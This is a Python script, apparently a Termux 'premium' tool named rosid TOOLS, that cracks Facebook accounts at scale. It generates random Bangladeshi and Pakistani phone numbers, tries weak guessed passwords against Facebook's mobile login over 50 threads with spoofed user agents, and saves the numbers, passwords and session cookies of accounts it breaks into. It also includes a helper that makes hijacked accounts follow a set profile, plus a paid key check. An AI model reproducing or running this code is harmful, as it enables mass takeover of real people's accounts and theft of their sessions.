
import os
import sys
import time
import requests
import uuid
os.system('clear')
def o():
    os.system('clear')
    print(logo)
    #ip = requests.get("https://api.ipify.org").text
 #   rosid("\033[92;1m[\033[94;1m◉\033[92;1m] IP ADDRES \033[38;5;196m: \033[1;32m"+ip)
    print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═")
    print("\033[92;1m[\033[94;1m2\033[1;33m]\033[1;33m  CONTACT ADMIN ON FACEBOOK")
    print("\033[92;1m[\033[94;1m3\033[92;1m] \033[1;34m CONTACT ADMIN ON WHATSAPP")
    print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═")
    rosid = input('\033[92;1m[\033[94;1m?\033[92;1m] Select menu \033[38;5;196m: ')
    if rosid == '1':
        i()
    if rosid == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100018760997097&mibextid=ZbWKwL')
    if rosid == '3':
        os.system('xdg-open https://wa.me/+8801936706784')
    if rosid == 'E':
        os.system('exit')
        return None
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class rosid:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)

def back():
	login()
rosid="rosid"
imt="ANCHAR"
ak="HAFEZ-"
myid=uuid.uuid4().hex[:8].upper()
try:
	key1 = open('/storage/emulated/0/android8.txt', 'r').read()
except:
	kok=open('/storage/emulated/0/android8.txt', 'w')
	kok.write(myid+imt)
	kok.close()
            
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
bi = random.choice([M,N,K,B,U])
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =("""\033[1;92m
_______  _______  _______ _________ ______  
(  ____ )(  ___  )(  ____ \\__   __/(  __  \ 
| (    )|| (   ) || (    \/   ) (   | (  \  )
| (____)|| |   | || (_____    | |   | |   ) |
|     __)| |   | |(_____  )   | |   | |   | |
| (\ (   | |   | |      ) |   | |   | |   ) |
| ) \ \__| (___) |/\____) |___) (___| (__/  )
|/   \__/(_______)\_______)\_______/(______/
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO rosid TOOLS               \033[;0m\033[1;91m\033[1;92m
\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m MD ABDUL rosid
\033[1;32m[-] GITHUB    :\033[1;32m rosid-CVS- TREM
\033[1;32m[-] FACEBOOK  :\033[1;32m Md abdul rosid 
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS rosid BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=['Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5367.149 Safari/537.36']

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
def main():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    
    print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═")
    print("	\33[37;41m\t  USE OUR COUNTRY CODE \33[0;m")
    print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═")
    print('\033[92;1m\033[1;32m PAK SIM CODE :\033[1;32m92301, \033[1;32m92302 ,\033[1;32m92303 ,\033[1;32m92305  \033[0;92m')
    print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═")
    print('\033[92;1m\033[1;32m  BD  SIM CODE :\033[1;32m+88016, \033[1;32m+88017 ,\033[1;32m+88018 ,\033[1;32m+88019 \033[0;92m')
    print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═")
    code = input(' CHOOSE CODE : ')
    print("")
    os.system('clear')
    print(logo)
    print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═")
    print("\033[92;1m[\033[94;1m◉\033[92;1m] EXAMPLE: 10000, 20000, 30000, 50000, 100000")
    limit = int(input("\033[92;1m[\033[94;1m◉\033[97;1m] \033[1;92mCRACK ID LIMIT \033[38;5;196m: \033[1;32m"))
      
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as setu:
        clear()
        print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═")
        print("\033[92;1m[\033[94;1m◉\033[92;1m] \033[1;92mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;92mAIRPLANE MODE ✈️")
        print("\033[92;1m[\033[94;1m◉\033[92;1m] \033[1;92mMIX IDZ CLONING ENJOY DEAR USER ✔")
        print("\033[92;1m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;32m═\033[1;97m═\033[38;5;196m═\033[1;35m═\033[1;34m═\033[1;33m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[38;5;196m═\033[1;33m═\033[1;33m═\033[1;32m═\033[1;34m═\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[38;5;196m═\033[38;5;196m══\033[1;33m══\033[1;35m══\033[1;34m══\033[1;33m═\033[1;97m═\033[38;5;196m═\033[1;97m═\033[1;97m═\033[1;32m═\033[1;34m═\033[1;33m══\033[1;35m═\033[1;34m══\033[1;34m══\033[38;5;196m═\033[1;97m═\033[1;33m══\033[1;34m═\033[1;32m═\033[1;35m═\033[1;34m═\033[1;33m═")
        for love  in user:
            pwx = [love ,love [2:],love [1:],code+love ,code+love [:3],'bangladesh','ilove you','freefire']
            uid = code+love 
            setu.submit(rcrack1,uid,pwx)
    print('\nCRACK PROCESS HAS BEEN COMPLETED ')
 
def rcrack1(uid,pwx):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=L5wvZP6L9mKOlruLdIIypo50; sb=L5wvZFMwM1zubVAS9LIkrYuM; zsh=ASQozBSrDTWl4Y8jlwncvLD_B3-a1Ha_cuP9VS9TCtttdZZ8wVVNfFOkweRzkj1IIb8A_0lchIfM2K_vPc7HcsceGDMYA6Y7gnLcnA6_bjdVcePUDo3qmLWlcAHVJ7Mqwye0KgvBw8KAekVI_0zLqzXwBQNVcwTO2xlRSwTFhhZzCgoFI8PlnizcCetArzxRTao2sfMT37SlKmh5nFujgccEt1dIWFDuqhGjHNmIJHiXZSK6RysvjSMRT9Q3ItbdgNYaW1bFtLFAYXAhLEhm70E5G6_9-CD9mRVEA2xTUP5g0qdFh33zCvB6W-SqSNaTN_x7DwxJIxzSbhTg; wd=980x1975; dpr=1.962499976158142; fr=06BbkBclzADMqIRtM..BkL5wv.9q.AAA.0.0.BkMXbI.AWWSDL4Pc_4',
    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent":'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text 
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[65:80]

                print('\033[38;5;46m ' +uid+' | '+ps+  '\n\033[1;36m[COOKIES💥] : \033[38;5;46m'+coki+ ' ')                
                open('/sdcard/rosid-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[65:80]
                #print('\033[38;5;46m ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/rosid-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\33[1;92m[%srosid🌻\033[0m/%s\33[1;92m]\033[1;92mOK-\033[38;5;46m%s'%(bi,loop,len(oks))),
        sys.stdout.flush()
    except:
        pass


def Subscraption():
	key1=open('/storage/emulated/0/android8.txt', 'r').read()
	r1=requests.get("https://pastebin.com/M6MTdv2n").text
	if key1 in r1:
		os.system('clear')
		o()
	else:
		os.system("clear")
		print(logo)
		print("\033[92;1m[\033[94;1m◉\033[97;1m]\33[0;92mYOUR ARE NOT A PREMIUM USER")
		print("\033[92;1m-══════════════════════════════════════════════════════")
		time.sleep(0.0009)
		print("\033[92;1m[\033[94;1m◉\033[97;1m]\33[0;92mPREMIUM TOPUP LIST")
		print("\033[92;1m[\033[94;1m◉\033[97;1m]\33[0;92m7 DAYS 200 TAKA")
		print("\033[92;1m[\033[94;1m◉\033[97;1m]\33[0;92m15 DAYS 400 TAKA")
		print("\033[92;1m[\033[94;1m◉\033[97;1m]\33[0;92mYour Key  :\033[1;94m "+ak+rosid+key1)
		name = input("\033[92;1m[\033[94;1m◉\033[97;1m]\33[0;92mYour Name : ")
		print("\033[9w;1m══════════════════════════════════════════════════════")
		input("\033[97;1m[\033[94;1m◉\033[97;1m]\33[0;92mPress Enter To Send Key")
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+rosid+''+key1
		os.system('am start https://wa.me/+8801936706784?text=' + tks)
		Subscraption() 
#Subscraption()
main()

